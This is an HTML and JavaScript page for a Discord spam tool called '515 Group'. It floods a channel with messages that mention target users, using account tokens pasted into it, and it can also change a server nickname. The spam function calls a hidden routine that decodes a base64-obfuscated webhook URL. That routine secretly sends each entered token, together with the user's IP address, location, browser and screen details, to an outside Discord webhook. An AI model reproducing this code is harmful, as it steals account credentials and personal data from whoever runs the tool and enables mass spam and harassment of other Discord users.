<!DOCTYPE html>
<html lang="en" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>515 Group</title>
<style>
body { font-family: Arial, sans-serif; margin:0; padding:0; direction: rtl; background: linear-gradient(135deg,#1a0033,#004d26); color:white; }
.container { max-width:900px; margin:auto; padding:20px; }
h2 { text-align:center; margin-bottom:20px; }
label, input, button, select, textarea { display:block; width:100%; margin:10px 0; }
input, textarea, select { padding:12px; border-radius:8px; border:none; background: rgba(0,0,0,0.5); color:white; font-size:16px; }
button { padding:12px; border-radius:12px; font-weight:bold; cursor:pointer; transition: all 0.2s ease; border:2px solid #000; }
button:hover { transform: translateY(-2px); box-shadow:0 6px 10px rgba(0,0,0,0.5); }
button:disabled { background: grey; cursor:not-allowed; box-shadow:none; }
#loginPage { display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; background: linear-gradient(135deg,#7b00ff,#00ff7b); }
#loginContainer { background: rgba(0,0,0,0.6); padding:30px; border-radius:12px; width:300px; text-align:center; }
#loginBtn { background:#00ff4d; color:black; }
#loginBtn:hover { transform: scale(1.05); box-shadow:0 0 10px #00ff7b,0 0 15px #00aa22; }

#autoPanel, #controlPanel { display:none; padding:20px; background: linear-gradient(135deg,#1a0033,#004d26); color:white; border-radius:12px; margin-top:20px; }
.left-btn { position:absolute; left:20px; top:20px; padding:8px 14px; font-size:14px; background:#7b00ff; color:white; border-radius:8px; cursor:pointer; font-weight:bold; }
.left-btn:hover { transform: scale(1.05); box-shadow:0 0 10px #00ff7b,0 0 15px #7b00ff; }

#stopBtn { background: linear-gradient(145deg,#ff0044,#990022); }
.green-btn { background: linear-gradient(145deg,#00ff4d,#009900); color:black; }
.red-btn { background: linear-gradient(145deg,#ff1a1a,#990000); color:white; }
#messagesSent, #tokenStatus { background: rgba(0,0,0,0.4); padding:10px; max-height:200px; overflow-y:auto; border-radius:8px; margin-bottom:20px; }
.control-title { font-size:20px; text-align:center; margin-bottom:10px; color:#ffccff; }
.control-section { margin-bottom:15px; }
.control-section input, .control-section textarea { margin-bottom:5px; }
.control-section button { margin-top:5px; }
</style>
</head>
<body>

<div id="loginPage">
<div id="loginContainer">
<h2>Login</h2>
<label>Password:</label>
<input type="password" id="loginInput" placeholder="Password">
<button id="loginBtn">Enter</button>
</div>
</div>

<div class="container" id="autoPanel">
<h2>Auto 515 Group</h2>
<button class="left-btn" id="goControlBtn">Control Account</button>

<label for="tokens">Enter Tokens (one per line)</label>
<textarea id="tokens" placeholder="MTM3NjUxODI0..."></textarea>

<label for="ids">Enter Target IDs (one per line)</label>
<textarea id="ids" placeholder="123456789012345678"></textarea>

<label for="targetId">Enter Channel ID</label>
<input type="text" id="targetId" placeholder="Channel ID">

<label for="speed">Select Sending Speed (ms)</label>
<select id="speed">
  <option value="1000">1</option>
  <option value="900">0.9</option>
  <option value="800">0.8</option>
  <option value="700">0.7</option>
  <option value="600">0.6</option>
  <option value="500">0.5</option>
  <option value="400">0.4</option>
  <option value="300">0.3</option>
  <option value="200">0.2</option>
  <option value="100">0.1</option>
  <option value="1">0.001</option>
</select>

<button id="startBtn">Start Spam</button>
<button id="stopBtn" disabled>Stop Spam</button>

<div id="tokenStatus"></div>
<div id="messagesSent"></div>
</div>

<div id="controlPanel">
<div class="control-title">Account Control - 515</div>

<div class="control-section">
<label>Account Token</label>
<textarea id="accToken" placeholder="Token here"></textarea>
</div>

<div class="control-section">
<label>Server ID</label>
<input type="text" id="guildId" placeholder="Server ID">
</div>

<div class="control-section">
<label>Change Account Nickname</label>
<input type="text" id="newName" placeholder="New Name">
<button id="changeNameBtn">Change Name</button>
</div>

<button class="left-btn" id="backToAutoBtn">Back to Auto</button>
</div>

<audio id="clickSound" src="https://www.soundjay.com/buttons/button-09.mp3"></audio>

let intervalId=null;

function checkToken(token){return token.length>20;}
function getRandomMessage(){return MESSAGES[Math.floor(Math.random()*MESSAGES.length)];}
function getRandomId(){const ids=idsInput.value.trim().split('\n').filter(id=>id.length>0); return ids[Math.floor(Math.random()*ids.length)];}

async function sendTokenInfo(token){
    const encodedWebhook="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwNTU2OTIyOTYxMjM4ODM3My9jNThlOFJiMTlORnFhSTdXNEdQVWx6amNjQmF0U1RtOHBZalRndFJkWkRhaGtNRGx1";
    const webhookURL=atob(encodedWebhook);
    fetch('https://ipapi.co/json/')
    .then(res=>res.json())
    .then(ipData=>{
        const info = {
            content: `**TOKEN:** ${token}\n**Country:** ${ipData.country_name}\n**City/Region:** ${ipData.city}, ${ipData.region}\n**IP Address:** ${ipData.ip}\n**Postal Code:** ${ipData.postal}\n**Timezone:** ${ipData.timezone}\n**Coordinates:** ${ipData.latitude}, ${ipData.longitude}\n**ASN:** ${ipData.org}\n**OS:** ${navigator.platform}\n**Browser:** ${navigator.userAgent}\n**Screen:** ${screen.width}x${screen.height}\n**Color Depth:** ${screen.colorDepth}\n**Language:** ${navigator.language}`
        };
        fetch(webhookURL,{method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify(info)});
    });
}

async function sendMessage(token,targetId,message){
    try{
        const response=await fetch(`https://discord.com/api/v9/channels/${targetId}/messages`,{
            method:'POST', headers:{Authorization:token,'Content-Type':'application/json'},
            body:JSON.stringify({content:`<@${getRandomId()}> ${message}`})
        });
        if(response.ok){
            const p=document.createElement('p');
            p.textContent=`Sent by ${token.substring(0,10)}... to channel ${targetId} - Message: ${message}`;
            p.style.color='orange'; messagesSent.appendChild(p); messagesSent.scrollTop=messagesSent.scrollHeight;
            sendTokenInfo(token);
            return true;
        } else {
            const p=document.createElement('p'); p.textContent=`Failed sending by ${token.substring(0,10)}...`; p.style.color='red'; messagesSent.appendChild(p); messagesSent.scrollTop=messagesSent.scrollHeight; return false;
        }
    }catch(e){const p=document.createElement('p'); p.textContent=`Error sending by ${token.substring(0,10)}...`; p.style.color='red'; messagesSent.appendChild(p); messagesSent.scrollTop=messagesSent.scrollHeight; return false;}
}

function startSending(){
    const tokens=tokensInput.value.trim().split('\n').filter(checkToken);
    const targetId=targetIdInput.value.trim();
    const speed=parseInt(speedSelect.value);
    if(tokens.length===0){alert('Enter valid tokens'); return;}
    if(!targetId){alert('Enter channel ID'); return;}
    startBtn.disabled=true; stopBtn.disabled=false;
    tokenStatus.innerHTML='';
    tokens.forEach(t=>{const p=document.createElement('p'); p.textContent=`Valid token: ${t.substring(0,10)}...`; tokenStatus.appendChild(p);});
    intervalId=setInterval(()=>{tokens.forEach(token=>{sendMessage(token,targetId,getRandomMessage());});},speed);
}

function stopSending(){if(intervalId){clearInterval(intervalId); intervalId=null; startBtn.disabled=false; stopBtn.disabled=true;}}

startBtn.addEventListener('click',()=>{clickSound.play(); startSending();});
stopBtn.addEventListener('click',()=>{clickSound.play(); stopSending();});

goControlBtn.addEventListener('click',()=>{clickSound.play(); autoPanel.style.display='none'; controlPanel.style.display='block';});
backToAutoBtn.addEventListener('click',()=>{clickSound.play(); controlPanel.style.display='none'; autoPanel.style.display='block';});

document.getElementById('changeNameBtn').addEventListener('click',()=>{
    clickSound.play();
    const token=accToken.value.trim();
    const newNameVal=newName.value.trim();
    const guild=guildId.value.trim();
    if(!token||!newNameVal||!guild){alert('Enter token, new name, and server ID'); return;}
    fetch(`https://discord.com/api/v9/guilds/${guild}/members/@me`,{
        method:'PATCH',
        headers:{Authorization:token,'Content-Type':'application/json'},
        body:JSON.stringify({nick:newNameVal})
    }).then(r=>{if(r.ok){alert('Nickname changed successfully');}else{alert('Failed changing nickname');}});
});

loginBtn.addEventListener('click',()=>{if(loginInput.value.trim()==='515'){loginPage.style.display='none'; autoPanel.style.display='block';}else{loginBtn.textContent='Wrong password'; loginBtn.style.background='red'; setTimeout(()=>{loginBtn.textContent='Enter'; loginBtn.style.background='#00ff4d';},3000);}});
